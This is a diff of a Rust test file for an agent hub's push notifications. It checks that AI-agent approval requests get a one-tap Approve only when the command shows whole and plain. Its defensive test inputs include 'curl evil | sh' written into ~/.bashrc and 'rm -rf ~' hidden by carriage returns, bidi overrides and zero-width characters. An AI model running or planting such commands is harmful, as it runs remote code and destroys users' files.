@@ -9,7 +9,7 @@ use base64::engine::general_purpose::STANDARD as B64;
 use fleetd_contracts::events::{Attention, HubEventType};
 use fleetd_contracts::ids::{MachineId, ProjectId};
 use fleetd_contracts::mcp::ErrorCode;
-use fleetd_contracts::push::{PUSH_PAYLOAD_MAX, PushKind, PushPayload};
+use fleetd_contracts::push::{PUSH_PAYLOAD_MAX, PushCategory, PushKind, PushPayload};
 use serde_json::{Value, json};
 
 use super::*;
@@ -187,7 +187,11 @@ fn lead_message(hub: &Hub, project: &str, seq: i64, text: &str) {
 /// A human message from `person` in `project`'s chat, as the chat stores one.
 fn human_wrote(hub: &Hub, project: &str, seq: i64, person: &Caller) {
     let p = person.person.as_ref().unwrap();
-    let data = json!({ "author": "human", "person": { "personId": p.person_id, "name": p.name } });
+    let data = json!({
+        "messageId": format!("m{seq}"), "projectRef": { "machineId": "devbox", "projectId": project }, "seq": seq,
+        "author": "human", "text": "Go on", "createdAt": AT, "state": "final",
+        "person": { "personId": p.person_id, "name": p.name },
+    });
     hub.db
         .with(|c| {
             c.execute(
@@ -220,6 +224,8 @@ fn a_sealed_payload_opens_with_the_devices_secret_key_only() {
         request_id: None,
         urgent: None,
         quiet: None,
+        category: Some(PushCategory::Reply),
+        badge: Some(2),
         at: AT.to_owned().into(),
     };
     let plain = payload_json(&payload);
@@ -242,6 +248,19 @@ fn a_sealed_payload_opens_with_the_devices_secret_key_only() {
     assert!(plain.len() <= PUSH_PAYLOAD_MAX);
     let cut: PushPayload = serde_json::from_slice(&plain).unwrap();
     assert!(cut.body.ends_with('…') && cut.body.chars().count() <= 1000);
+    // An approval cut so is no longer its whole command: reviewed in the app, never approved from the notification.
+    let cut: PushPayload = serde_json::from_slice(&payload_json(&PushPayload {
+        kind: PushKind::Approval,
+        category: Some(PushCategory::Approve),
+        ..long
+    }))
+    .unwrap();
+    assert_eq!(cut.category, Some(PushCategory::Review));
+
+    // The new fields are optional under v 1: a payload without them (an older hub's) still reads.
+    let old = json!({ "v": 1, "kind": "message", "title": "Ada", "body": "Hi", "hub": "http://devbox:4790", "at": AT });
+    let old: PushPayload = serde_json::from_value(old).unwrap();
+    assert_eq!((old.category, old.badge), (None, None));
 }
 
 #[tokio::test]
@@ -786,4 +805,448 @@ async fn the_default_relay_gets_no_key_and_nothing_in_the_clear() {
         .unwrap();
     assert!(sent.is_empty());
     assert!(follow.warned.keys().any(|w| w.contains("https only")));
+}
+
+/// A request opened in `project`, and the event announcing it. `asked` holds its `gated` or `permission`.
+fn request(
+    hub: &Hub,
+    project: &str,
+    kind: &str,
+    text: &str,
+    asked: Option<Value>,
+    attention: Attention,
+) -> String {
+    let mut r = json!({
+        "requestId": "Q1", "projectRef": { "machineId": "devbox", "projectId": project }, "kind": kind, "text": text,
+        "state": "open", "createdAt": AT,
+        "secret": (kind == "secret").then(|| json!({ "key": "stripe.key", "sink": "env:devbox:/work/app/.env" })),
+    });
+    if let (Some(r), Some(Value::Object(asked))) = (r.as_object_mut(), asked) {
+        r.extend(asked);
+    }
+    let r: HumanRequest = serde_json::from_value(r).unwrap();
+    let r = crate::hub::approvals::store::Requests::new(hub.db.clone())
+        .create(crate::hub::approvals::store::NewRequest {
+            project_ref: r.project_ref,
+            workstream_id: None,
+            kind: r.kind,
+            text: text.into(),
+            secret: r.secret,
+            gated: r.gated,
+            permission: r.permission,
+            preview_config: None,
+            at: AT.to_owned().into(),
+            at_ms: 1,
+        })
+        .unwrap();
+    hub.events
+        .append(NewEvent {
+            at: AT.to_owned().into(),
+            r#type: HubEventType::RequestOpened,
+            machine_id: Some(MachineId::unchecked("devbox")),
+            project_id: Some(ProjectId::unchecked(project)),
+            thread_id: None,
+            summary: format!("{} open", r.request_id),
+            data: Some(json!({ "requestId": r.request_id, "kind": kind, "state": "open" })),
+            attention: Some(attention),
+        })
+        .unwrap();
+    r.request_id.to_string()
+}
+
+fn gated(argv: &[&str], class: &str) -> Option<Value> {
+    Some(json!({ "gated": { "argv": argv, "class": class, "reason": "asked", "timeoutSec": 600 } }))
+}
+
+/// A session's tool prompt: `summary` as the node words it, `input` what runs once approved.
+fn prompt(tool: &str, summary: &str, input: Value) -> Option<Value> {
+    Some(json!({ "permission": {
+        "threadId": "th1", "requestId": "p1", "toolName": tool, "summary": summary, "input": input,
+    } }))
+}
+
+/// A lead message stored in `project`'s chat, as the chat keeps one.
+fn lead_said(hub: &Hub, project: &str, seq: i64, text: &str) {
+    let data = json!({
+        "messageId": format!("m{seq}"), "projectRef": { "machineId": "devbox", "projectId": project }, "seq": seq,
+        "author": "lead", "text": text, "createdAt": AT, "state": "final",
+    });
+    hub.db
+        .with(|c| {
+            c.execute(
+                "INSERT INTO chat_messages (machine_id, project_id, seq, created_ms, data) VALUES ('devbox', ?, ?, 1, ?)",
+                params![project, seq, data.to_string()],
+            )?;
+            Ok(())
+        })
+        .unwrap();
+}
+
+#[tokio::test]
+async fn an_approval_is_answered_from_its_notification_only_when_it_is_whole_and_safe() {
+    let (hub, _home) = hub();
+    let owner = owner_device(&hub);
+    let (key, _) = phone(&hub, &owner, "ios", "aa11").await;
+    let (relay, url) = fake_relay().await;
+    ok(&hub, &owner, "push_relay_set", json!({ "url": url })).await;
+    let http = reqwest::Client::new();
+    let mut follow = Follow::default();
+    let cursor = hub.events.head();
+
+    let long = "x".repeat(1200);
+    request(
+        &hub,
+        "app",
+        "approval",
+        "Push the fix.",
+        gated(&["git", "push"], "credential"),
+        Attention::Loud,
+    );
+    request(
+        &hub,
+        "app",
+        "approval",
+        "Ship it",
+        gated(&["./deploy.sh", "prod"], "irreversible"),
+        Attention::Urgent,
+    );
+    request(
+        &hub,
+        "app",
+        "approval",
+        "Pay the invoice",
+        gated(&["pay", "42 EUR"], "money"),
+        Attention::Urgent,
+    );
+    request(
+        &hub,
+        "app",
+        "approval",
+        "Write it",
+        gated(&["echo", &long], "credential"),
+        Attention::Loud,
+    );
+    request(
+        &hub,
+        "app",
+        "secret",
+        "The Stripe key",
+        None,
+        Attention::Loud,
+    );
+    step(&hub, &http, &mut follow, cursor).await.unwrap();
+    let got: Vec<PushPayload> = relay
+        .got
+        .lock()
+        .unwrap()
+        .iter()
+        .map(|p| opened(&key, p))
+        .collect();
+    let shown: Vec<_> = got
+        .iter()
+        .map(|p| (p.kind, p.body.as_str(), p.category, p.urgent))
+        .collect();
+    assert_eq!(
+        shown[..3],
+        [
+            // Why, then exactly what runs.
+            (
+                PushKind::Approval,
+                "Push the fix: git push",
+                Some(PushCategory::Approve),
+                None
+            ),
+            // Money and irreversible commands show their full card in the app first.
+            (
+                PushKind::Approval,
+                "Ship it: ./deploy.sh prod",
+                Some(PushCategory::Review),
+                Some(true)
+            ),
+            (
+                PushKind::Approval,
+                "Pay the invoice: pay \"42 EUR\"",
+                Some(PushCategory::Review),
+                Some(true)
+            ),
+        ]
+    );
+    // A command too long to show whole is reviewed in the app; a secret is entered there, with no action.
+    assert_eq!(got[3].category, Some(PushCategory::Review));
+    assert_eq!(
+        (got[4].body.as_str(), got[4].category),
+        ("The Stripe key", None)
+    );
+}
+
+#[tokio::test]
+async fn each_notification_carries_its_persons_badge() {
+    let (hub, _home) = hub();
+    let owner = owner_device(&hub);
+    let alice = member(&hub, &owner, "Alice", "alice-phone").await;
+    let (key, _) = phone(&hub, &owner, "ios", "aa11").await;
+    let (relay, url) = fake_relay().await;
+    ok(&hub, &owner, "push_relay_set", json!({ "url": url })).await;
+    let http = reqwest::Client::new();
+    let mut follow = Follow::default();
+    let cursor = hub.events.head();
+
+    // Two approvals open in one chat, and Ada's chat waits on an answer: three things need the owner.
+    request(
+        &hub,
+        "app",
+        "approval",
+        "Push",
+        gated(&["git", "push"], "credential"),
+        Attention::Loud,
+    );
+    request(
+        &hub,
+        "app",
+        "approval",
+        "Tag",
+        gated(&["git", "tag", "v1"], "credential"),
+        Attention::Loud,
+    );
+    lead_said(&hub, "navi", 1, "Which flight do you want?");
+    lead_message(&hub, "navi", 1, "Which flight do you want?");
+    let (cursor, _, _) = step(&hub, &http, &mut follow, cursor).await.unwrap();
+    let got: Vec<PushPayload> = relay
+        .got
+        .lock()
+        .unwrap()
+        .iter()
+        .map(|p| opened(&key, p))
+        .collect();
+    assert_eq!(
+        got.iter().map(|p| p.badge).collect::<Vec<_>>(),
+        [Some(3); 3]
+    );
+    assert_eq!(
+        (got[2].kind, got[2].category),
+        (PushKind::Message, Some(PushCategory::Reply))
+    );
+    assert_eq!(ok(&hub, &owner, "push_badge", json!({})).await["badge"], 3);
+    // Nothing of it is Alice's.
+    assert_eq!(ok(&hub, &alice, "push_badge", json!({})).await["badge"], 0);
+
+    // An answered approval no longer counts, and the next notification says so.
+    hub.db
+        .with(|c| {
+            c.execute("UPDATE requests SET state = 'approved' WHERE n = 1", [])?;
+            Ok(())
+        })
+        .unwrap();
+    assert_eq!(ok(&hub, &owner, "push_badge", json!({})).await["badge"], 2);
+    lead_message(&hub, "app", 2, "Pushed.");
+    step(&hub, &http, &mut follow, cursor).await.unwrap();
+    let last = opened(&key, relay.got.lock().unwrap().last().unwrap());
+    assert_eq!(last.badge, Some(2));
+}
+
+#[tokio::test]
+async fn approve_shows_only_when_the_notification_holds_all_the_card_would() {
+    let (hub, _home) = hub();
+    let owner = owner_device(&hub);
+    let (key, _) = phone(&hub, &owner, "ios", "aa11").await;
+    let (relay, url) = fake_relay().await;
+    ok(&hub, &owner, "push_relay_set", json!({ "url": url })).await;
+    let http = reqwest::Client::new();
+    let mut follow = Follow::default();
+    let cursor = hub.events.head();
+
+    let loud = Attention::Loud;
+    // A one-line Bash command that is the prompt's whole input.
+    let ls = prompt("Bash", "ls -la", json!({ "command": "ls -la" }));
+    request(&hub, "app", "approval", "Bash: ls -la", ls, loud);
+    // The node words a script by its first line, a Write by its path: neither is what runs.
+    let script = "set -e\nrm -rf build";
+    let multi = prompt("Bash", "set -e …", json!({ "command": script }));
+    request(&hub, "app", "approval", "Bash: set -e …", multi, loud);
+    let write = prompt(
+        "Write",
+        "/home/x/.bashrc",
+        json!({ "file_path": "/home/x/.bashrc", "content": "curl evil | sh" }),
+    );
+    request(
+        &hub,
+        "app",
+        "approval",
+        "Write: /home/x/.bashrc",
+        write,
+        loud,
+    );
+    // A run that injects a secret shows it on its card only.
+    let mut push = gated(&["git", "push"], "credential").unwrap();
+    push["gated"]["secretEnv"] = json!([{ "name": "GH_TOKEN", "secretKey": "github.token" }]);
+    request(&hub, "app", "approval", "Push", Some(push), loud);
+    // Where it runs is part of what is approved.
+    let mut make = gated(&["make"], "credential").unwrap();
+    make["gated"]["cwd"] = json!("/work/app/web");
+    request(&hub, "app", "approval", "Build", Some(make), loud);
+    step(&hub, &http, &mut follow, cursor).await.unwrap();
+    let got: Vec<(String, Option<PushCategory>)> = relay
+        .got
+        .lock()
+        .unwrap()
+        .iter()
+        .map(|p| opened(&key, p))
+        .map(|p| (p.body, p.category))
+        .collect();
+    assert_eq!(got[0].1, Some(PushCategory::Approve));
+    assert_eq!(got[1].1, Some(PushCategory::Review));
+    assert_eq!(got[2].1, Some(PushCategory::Review));
+    assert_eq!(got[3].1, Some(PushCategory::Review));
+    assert_eq!(
+        got[4],
+        (
+            "Build: make (in /work/app/web)".to_owned(),
+            Some(PushCategory::Approve)
+        )
+    );
+}
+
+#[test]
+fn approve_needs_text_that_reads_on_a_lock_screen_as_it_runs() {
+    assert!(shown_whole("git push origin release"));
+    assert!(shown_whole("echo 'naïve café ✓' > notes.txt"));
+    let refused = [
+        // Lines that break or return: \r, \n, NEL, line and paragraph separators.
+        ("carriage return", "ls\rrm -rf ~"),
+        ("newline", "ls\nrm -rf ~"),
+        ("next line", "ls\u{0085}rm -rf ~"),
+        ("line separator", "ls\u{2028}rm -rf ~"),
+        ("paragraph separator", "ls\u{2029}rm -rf ~"),
+        // Bidi controls that reorder what shows.
+        ("right-to-left override", "ls \u{202E}fr- mr"),
+        ("left-to-right embedding", "ls \u{202A}x"),
+        ("pop directional formatting", "ls \u{202C}x"),
+        ("right-to-left isolate", "ls \u{2067}x\u{2069}"),
+        ("first strong isolate", "ls \u{2068}x"),
+        ("left-to-right mark", "ls\u{200E} x"),
+        ("right-to-left mark", "ls\u{200F} x"),
+        ("arabic letter mark", "ls\u{061C} x"),
+        // Other control characters.
+        ("bell", "ls\u{7}"),
+        ("escape", "ls \u{1B}[2K"),
+        ("tab", "ls\tx"),
+        ("delete", "ls\u{7F}"),
+        // Zero-width characters that hide text.
+        ("zero-width space", "r\u{200B}m -rf ~"),
+        ("zero-width joiner", "r\u{200D}m"),
+        ("zero-width non-joiner", "r\u{200C}m"),
+        ("word joiner", "r\u{2060}m"),
+        ("byte order mark", "\u{FEFF}rm"),
+        ("tag characters", "ls\u{E0041}"),
+        // More than a lock screen shows whole, and nothing at all.
+        ("too long", &"x".repeat(201)),
+        ("blank", "   "),
+    ];
+    for (what, text) in refused {
+        assert!(!shown_whole(text), "{what} passed");
+    }
+    assert!(shown_whole(&"x".repeat(200)));
+}
+
+#[tokio::test]
+async fn a_command_that_hides_or_reorders_text_is_reviewed_in_the_app() {
+    let (hub, _home) = hub();
+    let owner = owner_device(&hub);
+    let (key, _) = phone(&hub, &owner, "ios", "aa11").await;
+    let (relay, url) = fake_relay().await;
+    ok(&hub, &owner, "push_relay_set", json!({ "url": url })).await;
+    let http = reqwest::Client::new();
+    let mut follow = Follow::default();
+    let cursor = hub.events.head();
+
+    let loud = Attention::Loud;
+    for command in [
+        "ls\rrm -rf ~",
+        "ls \u{202E}fr- mr",
+        "r\u{200B}m -rf ~",
+        "ls\u{2028}rm",
+    ] {
+        let asked = prompt("Bash", command, json!({ "command": command }));
+        request(&hub, "app", "approval", "Bash", asked, loud);
+    }
+    let long = "x".repeat(300);
+    let asked = prompt("Bash", &long, json!({ "command": long }));
+    request(&hub, "app", "approval", "Bash", asked, loud);
+    // A gated run's words too: its card quotes them, but JSON leaves bidi and zero-width characters as they are.
+    request(
+        &hub,
+        "app",
+        "approval",
+        "Run",
+        gated(&["ls", "\u{202E}fr-"], "credential"),
+        loud,
+    );
+    request(
+        &hub,
+        "app",
+        "approval",
+        "Run",
+        gated(&["ls", "a\u{200B}b"], "credential"),
+        loud,
+    );
+    step(&hub, &http, &mut follow, cursor).await.unwrap();
+    let got: Vec<Option<PushCategory>> = relay
+        .got
+        .lock()
+        .unwrap()
+        .iter()
+        .map(|p| opened(&key, p).category)
+        .collect();
+    assert_eq!(got, [Some(PushCategory::Review); 7]);
+}
+
+#[tokio::test]
+async fn every_text_beside_an_approvable_command_is_plain_too() {
+    let (hub, _home) = hub();
+    let owner = owner_device(&hub);
+    let (key, _) = phone(&hub, &owner, "ios", "aa11").await;
+    let (relay, url) = fake_relay().await;
+    ok(&hub, &owner, "push_relay_set", json!({ "url": url })).await;
+    // A project whose title ends in a right-to-left override, above the command.
+    let flipped: fleetd_contracts::model::ProjectSummary = serde_json::from_value(json!({
+        "machineId": "devbox", "projectId": "flip", "title": "Shop\u{202E}", "workspaceRoot": "/work/flip",
+        "threads": { "running": 0, "waiting": 0, "idle": 0, "failed": 0 }, "lastActivityAt": AT,
+    }))
+    .unwrap();
+    hub.store
+        .projects_upsert_many(&MachineId::unchecked("devbox"), &[flipped])
+        .unwrap();
+    let http = reqwest::Client::new();
+    let mut follow = Follow::default();
+    let cursor = hub.events.head();
+
+    let loud = Attention::Loud;
+    let push = || gated(&["git", "push"], "credential");
+    // The same command, plain all round, offers Approve.
+    request(&hub, "app", "approval", "Push the fix", push(), loud);
+    // The reason, just before the command, ending in a right-to-left override or mark, or holding a zero-width space.
+    for why in [
+        "Push the fix\u{202E}",
+        "Push\u{200F}",
+        "Push\u{200B} the fix",
+        "Push\u{2028}the fix",
+    ] {
+        request(&hub, "app", "approval", why, push(), loud);
+    }
+    request(&hub, "flip", "approval", "Push the fix", push(), loud);
+    // The directory it runs in, shown after it.
+    let mut cwd = push().unwrap();
+    cwd["gated"]["cwd"] = json!("/work/app/\u{2067}web");
+    request(&hub, "app", "approval", "Push the fix", Some(cwd), loud);
+    step(&hub, &http, &mut follow, cursor).await.unwrap();
+    let got: Vec<Option<PushCategory>> = relay
+        .got
+        .lock()
+        .unwrap()
+        .iter()
+        .map(|p| opened(&key, p).category)
+        .collect();
+    assert_eq!(got[0], Some(PushCategory::Approve));
+    assert_eq!(got[1..], [Some(PushCategory::Review); 6]);
+    assert!(plain("Push the fix") && !plain("Shop\u{202E}") && !plain("a\u{FEFF}"));
 }
